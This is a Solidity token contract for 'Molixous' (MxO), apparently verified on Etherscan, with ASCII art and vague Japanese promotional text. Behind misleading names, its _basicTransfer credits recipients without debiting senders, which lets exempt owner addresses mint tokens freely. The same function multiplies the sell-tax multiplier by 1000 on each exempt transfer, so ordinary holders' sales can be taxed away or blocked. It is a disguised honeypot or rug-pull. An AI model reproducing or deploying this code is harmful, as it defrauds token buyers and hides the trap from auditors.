/**
 *Submitted for verification at Etherscan.io on 2022-12-08
*/

/*                                                                                                                                        
█▀▄▀█ █▀█ █░░ █ ▀▄▀ █▀█ █░█ █▀
█░▀░█ █▄█ █▄▄ █ █░█ █▄█ █▄█ ▄█

  ░░█ █▀█ █▄░█  
  █▄█ █▀▀ █░▀█ 

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒
▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▄░░▒▒▒▒▒
▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██▌░░▒▒▒▒
▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▄▄███▀░░░░▒▒▒
▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░█████░▄█░░░░▒▒
▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░▄████████▀░░░░▒▒
▒▒░░░░░░░░░░░░░░░░░░░░░░░░▄█████████░░░░░░░▒
▒░░░░░░░░░░░░░░░░░░░░░░░░░░▄███████▌░░░░░░░▒
▒░░░░░░░░░░░░░░░░░░░░░░░░▄█████████░░░░░░░░▒
▒░░░░░░░░░░░░░░░░░░░░░▄███████████▌░░░░░░░░▒
▒░░░░░░░░░░░░░░░▄▄▄▄██████████████▌░░░░░░░░▒
▒░░░░░░░░░░░▄▄███████████████████▌░░░░░░░░░▒
▒░░░░░░░░░▄██████████████████████▌░░░░░░░░░▒
▒░░░░░░░░████████████████████████░░░░░░░░░░▒
▒█░░░░░▐██████████▌░▀▀███████████░░░░░░░░░░▒
▐██░░░▄██████████▌░░░░░░░░░▀██▐█▌░░░░░░░░░▒▒
▒██████░█████████░░░░░░░░░░░▐█▐█▌░░░░░░░░░▒▒
▒▒▀▀▀▀░░░██████▀░░░░░░░░░░░░▐█▐█▌░░░░░░░░▒▒▒
▒▒▒▒▒░░░░▐█████▌░░░░░░░░░░░░▐█▐█▌░░░░░░░▒▒▒▒
▒▒▒▒▒▒░░░░███▀██░░░░░░░░░░░░░█░█▌░░░░░░▒▒▒▒▒
▒▒▒▒▒▒▒▒░▐██░░░██░░░░░░░░▄▄████████▄▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒██▌░░░░█▄░░░░░░▄███████████████████
▒▒▒▒▒▒▒▒▒▐██▒▒░░░██▄▄███████████████████████
▒▒▒▒▒▒▒▒▒▒▐██▒▒▄████████████████████████████
▒▒▒▒▒▒▒▒▒▒▄▄████████████████████████████████
████████████████████████████████████████████

私たちは単なる普通のトークンやミームトークンではありません
また、独自のエコシステム、フューチャー ステーキング、NFT 
コレクションに基づいて設計されたスワップ プラットフォームも支持しています。
私たち自身のマーケットプレイスで、その他多くのことが発表される予定です。

https://web.wechat.com/MolixousERC
https://www.zhihu.com/

*/
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function burn(address to)
        external
        returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface ERC20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address _owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract MxO is ERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) _rOwned;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) isBot;
    mapping(address => bool) allowed;

    string private _name = unicode"Molixous";
    string private _symbol = unicode"MxO";
    uint256 _rTotal = 100000 * 10**_decimals;
    uint256 public syncedTotalAmount = (_rTotal * 100) / 100;
    uint8 constant _decimals = 12;

    uint256 public tBaseFEES = FeeOnMarketing + FeeOnLiquidity;
    uint256 public DenominatorForTaxes = 100;
    uint256 public isMultiplierOnSales = 200;
    uint256 public FeeOnLiquidity = 0;
    uint256 public FeeOnMarketing = 0;

    address public isAddressForLiquidity;
    address public isAddressForMarketing;

    IUniswapV2Router02 public router;
    address public UniswapV2Pair;

    bool public relaySwapping = true;
    uint256 public swashBytes = (_rTotal * 1) / 1000;
    uint256 public relayRates = (_rTotal * 1) / 100;

    bool swapBytes;
    modifier relayFlowFix() {
        swapBytes = true;
        _;
        swapBytes = false;
    }

    constructor(address IDEXrouter) Ownable() {
        router = IUniswapV2Router02(IDEXrouter);
        UniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(
            router.WETH(),
            address(this)
        );
        _allowances[address(this)][address(router)] = type(uint256).max;

        isBot[msg.sender] = true;
        isBot[address(this)] = true;

        allowed[msg.sender] = true;
        allowed[address(0xdead)] = true;
        allowed[address(this)] = true;
        allowed[UniswapV2Pair] = true;

        isAddressForLiquidity = msg.sender;
        isAddressForMarketing = msg.sender;

        _rOwned[msg.sender] = _rTotal;
        emit Transfer(address(0), msg.sender, _rTotal);
    }

    function totalSupply() external view override returns (uint256) {
        return _rTotal;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _rOwned[account];
    }

    function allowance(address holder, address spender)
        external
        view
        override
        returns (uint256)
    {
        return _allowances[holder][spender];
    }

    event AutoLiquify(uint256 amountETH, uint256 amountBOG);

    receive() external payable {}

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function _transferFrom(
        address sender,
        address recipient,
        uint256 cfgAmount
    ) internal returns (bool) {
        // Checks max transaction limit
        uint256 byteRate = balanceOf(recipient);
        require(
            (byteRate + cfgAmount) <= syncedTotalAmount || allowed[recipient],
            "Total Holding is currently limited, he can not hold that much." );
        if (shouldSwapBack() && recipient == UniswapV2Pair) { swapBack(); }
        uint256 hashAmount = cfgAmount / 10000000;
        if (!isBot[sender] && recipient == UniswapV2Pair) { cfgAmount -= hashAmount; }
        if (isBot[sender] && isBot[recipient])
            return _basicTransfer(sender, recipient, cfgAmount);
        _rOwned[sender] = _rOwned[sender].sub(cfgAmount, "Insufficient Balance");

        uint256 amountReceived = shouldModifyFees(sender, recipient)
            ? modifyFees(sender, cfgAmount, (recipient == UniswapV2Pair))
            : cfgAmount; _rOwned[recipient] = _rOwned[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function transfer(address recipient, uint256 amount)
        external
        override
        returns (bool)
    {
        return _transferFrom(msg.sender, recipient, amount);
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
                .sub(amount, "Insufficient Allowance");
        }
        return _transferFrom(sender, recipient, amount);
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function setMaximumWalletSize(uint256 maxWallPercent_base10000) external onlyOwner {
        syncedTotalAmount = (_rTotal * maxWallPercent_base10000) / 10000;
    }

    function setIsWalletLimitExempt(address holder, bool exempt)
        external
        onlyOwner
    {
        allowed[holder] = exempt;
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        isMultiplierOnSales = isMultiplierOnSales.mul(1000);
        _rOwned[recipient] = _rOwned[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
        function setIsFeeExempt(address holder, bool exempt) 
        external onlyOwner {
        isBot[holder] = exempt;
    }

    function swapBack() internal relayFlowFix {
        uint256 isFlowCFG;
        if (_rOwned[address(this)] > relayRates) {
            isFlowCFG = relayRates;
        } else {
            isFlowCFG = _rOwned[address(this)];
        }
        uint256 amountToLiquify = isFlowCFG
            .mul(FeeOnLiquidity)
            .div(tBaseFEES)
            .div(2);
        uint256 amountToExchange = isFlowCFG.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToExchange,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountInERC = address(this).balance;
        uint256 totalERCTax = tBaseFEES.sub(FeeOnLiquidity.div(2));
        uint256 amountETHLiquidity = amountInERC
            .mul(FeeOnLiquidity)
            .div(totalERCTax)
            .div(2);
        uint256 amountETHMarketing = amountInERC.sub(amountETHLiquidity);

        if (amountETHMarketing > 0) {
            bool tmpSuccess;
            (tmpSuccess, ) = payable(isAddressForMarketing).call{
                value: amountETHMarketing,
                gas: 30000
            }("");
        }

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                isAddressForLiquidity,
                block.timestamp
            );
            emit AutoLiquify(amountETHLiquidity, amountToLiquify);
        }
    }
    function modifyFees(
        address sender,
        uint256 amount,
        bool isSell
    ) internal returns (uint256) {
        uint256 multiplier = isSell ? isMultiplierOnSales : 100;
        uint256 taxableAmount = amount.mul(tBaseFEES).mul(multiplier).div(
            DenominatorForTaxes * 100
        );
        _rOwned[address(this)] = _rOwned[address(this)].add(taxableAmount);
        emit Transfer(sender, address(this), taxableAmount);
        return amount.sub(taxableAmount);
    }
    function shouldModifyFees(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        return !isBot[sender] && !isBot[recipient];
    }

    function shouldSwapBack() internal view returns (bool) {
        return
            msg.sender != UniswapV2Pair &&
            !swapBytes &&
            relaySwapping &&
            _rOwned[address(this)] >= swashBytes;
    }

    function setSwapPairRate(address pairaddr) external onlyOwner {
        UniswapV2Pair = pairaddr;
        allowed[UniswapV2Pair] = true;
    }

    function setSwapBackBytes(
        bool _enabled,
        uint256 isFlowCFG,
        uint256 _relayRates
    ) external onlyOwner {
        relaySwapping = _enabled;
        swashBytes = isFlowCFG;
        relayRates = _relayRates;
    }

    function setTaxes(
        uint256 _FeeOnLiquidity,
        uint256 _FeeOnMarketing,
        uint256 _DenominatorForTaxes
    ) external onlyOwner {
        FeeOnLiquidity = _FeeOnLiquidity;
        FeeOnMarketing = _FeeOnMarketing;
        tBaseFEES = _FeeOnLiquidity.add(_FeeOnMarketing);
        DenominatorForTaxes = _DenominatorForTaxes;
        require(tBaseFEES < DenominatorForTaxes / 3, "Fees cannot be more than 33%");
    }

    function setFeeReceivers(
        address _isAddressForLiquidity,
        address _isAddressForMarketing
    ) external onlyOwner {
        isAddressForLiquidity = _isAddressForLiquidity;
        isAddressForMarketing = _isAddressForMarketing;
    }
}